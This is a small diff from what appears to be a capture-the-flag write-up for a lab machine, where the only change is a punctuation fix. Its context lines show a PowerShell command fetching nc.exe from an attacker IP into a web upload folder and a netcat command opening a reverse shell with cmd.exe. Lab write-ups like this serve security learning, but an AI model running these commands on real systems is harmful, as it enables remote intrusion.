@@ -112,7 +112,7 @@ C:\xampp\htdocs\gym\upload> powershell -c "curl.exe http://10.10.14.127/nc.exe -
 C:\xampp\htdocs\gym\upload> netcat.exe 10.10.14.127 9001 -e cmd.exe
 ```
 
-After a while listening , I recieve a reverse shell :
+After a while listening , I recieve a reverse shell:
 
 ![rev](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/rev.png)
 
